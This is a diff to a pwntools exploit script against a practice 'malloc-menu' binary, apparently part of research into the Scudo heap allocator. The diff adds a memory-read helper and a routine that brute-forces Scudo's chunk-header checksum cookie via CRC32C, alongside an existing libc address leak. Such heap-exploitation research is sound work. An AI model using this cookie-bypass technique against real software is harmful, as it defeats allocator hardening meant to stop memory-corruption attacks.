@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 from pwn import *
+from crc32c import crc32c
 
 elf = context.binary = ELF("../scudo-gdb-tooling/malloc-menu-linux")
 
@@ -27,18 +28,19 @@ def start():
         return process(elf.path, env=env, stdin=PTY)
 
 # Select the "malloc" option, send size & data.
-def malloc(size, data):
+def malloc(size, data=b""):
     io.send(b"1\n")
     io.sendafter(b"allocate: ", f"{size}\n".encode())
     chunk = io.recvline()
     index = chunk.split(b' ')[4]
     address = int(chunk.split(b' ')[7], 16)
-    io.sendafter(b"quit\n", b"3\n")
-    io.sendafter(b"address: ", b"2\n")
-    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
-    io.sendafter(b"write: ", f"{len(data)}\n".encode())
-    io.sendafter(b"write: ", data)
-    io.send(b"\n")
+    if len(data) != 0:
+        io.sendafter(b"quit\n", b"3\n")
+        io.sendafter(b"address: ", b"2\n")
+        io.sendafter(b"address: ", f"{hex(address)}\n".encode())
+        io.sendafter(b"write: ", f"{len(data)}\n".encode())
+        io.sendafter(b"write: ", data)
+        io.send(b"\n")
     return (index, address)
 
 # Send the "free" option, send the address
@@ -55,11 +57,42 @@ def write(address, data):
     io.sendafter(b"write: ", data)
     io.send(b"\n")
 
+def read(address, size):
+    io.send(b"4\n")
+    io.sendafter(b"address: ", b"2\n")
+    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
+    io.sendafter(b"read: ", f"{size}\n".encode())
+    res = []
+    for i in range((size//16)):
+        res += [int(x, base=16) for x in io.recvline(keepends=False).split(b' ')]
+    return res
+
 def get_libc_leak():
     io.send(b"6\n")
     io.recvuntil(b'@ ')
     leak = int(io.recvline(keepends=False), base=16) - elf.libc.sym.puts
     return leak
+
+def bruteforce_cookie(addr):
+    header = read(addr-0x10, 0x10)[0]
+
+    checksum = header >> 0x30
+    header = header & ((1 << 0x30)-1)
+
+    cookie = 0
+    crc = 0
+    while crc != checksum:
+        cookie %= (1 << 0x40)
+        cookie += 1
+        crc = crc32c(header.to_bytes(8, byteorder='big'), crc32c(addr.to_bytes(8, byteorder='big'), cookie))
+        crc = crc ^ (crc >> 0x10)
+        if cookie == 0:
+            error("Cookie not found")
+            break
+        if cookie % 10000000 == 0:
+            info(f"Cookie at {cookie}")
+            
+    return cookie
 
 def populate_quarantine():
     for i in range(0x1000):
@@ -77,13 +110,19 @@ io = start()
 ind1, add1 = malloc(24, b"Y"*24)
 ind2, add2 = malloc(24, b"X"*24)
 
+info(f"address 1: {hex(add1)} address 2: {hex(add2)}")
+
 write(add1, b"X"*12)
 write(add2, b"Y"*12)
+
+info(f"bruteforced cookie: {bruteforce_cookie(add1)}")
+
+io.interactive()
 
 free(add1)
 free(add2)
 
-populate_quarantine()
+#populate_quarantine()
 
 # =============================================================================
 
